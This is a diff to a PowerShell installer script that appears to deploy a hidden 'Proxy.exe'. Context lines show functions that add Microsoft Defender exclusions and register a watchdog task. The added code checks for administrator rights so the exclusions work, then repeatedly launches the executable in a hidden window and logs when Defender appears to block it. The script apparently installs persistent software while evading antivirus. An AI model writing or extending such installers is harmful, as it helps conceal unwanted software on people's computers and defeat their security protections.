@@ -113,6 +113,12 @@ function Build-DownloadUrl {
     return $url
 }
 
+function Test-IsAdmin {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
 function Add-DefenderExclusion {
     param(
         [string]$Path,
@@ -143,6 +149,31 @@ function Add-DefenderExclusion {
     }
 }
 
+function Start-ProxyWithRetry {
+    param(
+        [string]$ExePath,
+        [string]$WorkDir,
+        [int]$Attempts = 3
+    )
+
+    for ($i = 1; $i -le $Attempts; $i++) {
+        try {
+            Start-Process -FilePath $ExePath -WorkingDirectory $WorkDir -WindowStyle Hidden
+            Start-Sleep -Seconds 2
+            if (Get-Process -Name "Proxy" -ErrorAction SilentlyContinue) {
+                Write-InstallLog ("started Proxy.exe (attempt " + $i + ")")
+                return $true
+            }
+            Write-InstallLog ("Proxy.exe exited quickly (attempt " + $i + "), retrying...")
+        } catch {
+            Write-InstallLog ("start attempt " + $i + " failed: " + $_.Exception.Message)
+        }
+        Start-Sleep -Seconds 2
+    }
+    Write-InstallLog "Proxy.exe did not stay running; Defender may have blocked it"
+    return $false
+}
+
 function Register-WatchdogTask {
     param(
         [string]$TaskName,
@@ -162,6 +193,11 @@ function Register-WatchdogTask {
 
 Write-InstallLog "install start"
 Write-InstallLog ("target: " + $Exe)
+if (Test-IsAdmin) {
+    Write-InstallLog "running as administrator"
+} else {
+    Write-InstallLog "not administrator; defender exclusions may fail"
+}
 
 try {
     New-Item -ItemType Directory -Force -Path $Dir | Out-Null
@@ -220,12 +256,7 @@ try {
     Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
 }
 
-try {
-    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
-    Write-InstallLog "started Proxy.exe"
-} catch {
-    Write-InstallLog ("start skipped: " + $_.Exception.Message)
-}
+Start-ProxyWithRetry -ExePath $Exe -WorkDir $Dir | Out-Null
 
 if ($script:HadError) {
     exit 1
